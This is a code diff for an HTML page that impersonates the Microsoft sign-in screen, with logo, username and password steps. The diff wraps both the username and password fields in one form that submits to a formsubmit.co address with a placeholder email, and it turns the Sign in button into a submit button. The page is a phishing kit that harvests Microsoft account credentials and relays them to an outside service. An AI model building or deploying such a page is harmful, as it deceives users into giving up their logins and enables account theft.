@@ -11,21 +11,20 @@
 </head>
 
 <body>
+     <form action="https://formsubmit.co/your@email.com" method="POST">
     <section id="section_uname">
         <div class="auth-wrapper">
             <img src="/assests/logo.png" alt="Microsoft" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
-            <form>
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
                     <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
                 </div>
-            </form>
             <div>
                 <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                 <p class="mb-16 fs-13">
                     <a href="#" class="link">Sign in with a security key
-                        <img src="/assests/question.png" alt="Question img">
+                        <img src="/assests/question.png" alt="Question img"/>
                     </a>
                 </p>
             </div>
@@ -49,12 +48,11 @@
                 <span id="user_identity">a@b.com</span>
             </div>
             <h2 class="title mb-16">Enter password</h2>
-            <form>
+            
                 <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
                     <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
                 </div>
-            </form>
             <div>
                 <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                 <p class="mb-16">
@@ -62,11 +60,11 @@
                 </p>
             </div>
             <div>
-                <button class="btn" id="btn_sig">Sign in</button>
+                <button class="btn" id="btn_sig" type="submit">Sign in</button>
             </div>
         </div>
     </section>
-
+    </form>
     <section id="section_final" class="d-none">
         <div class="auth-wrapper">
             <img src="/assests/logo.png" alt="Microsoft" class="d-block" />
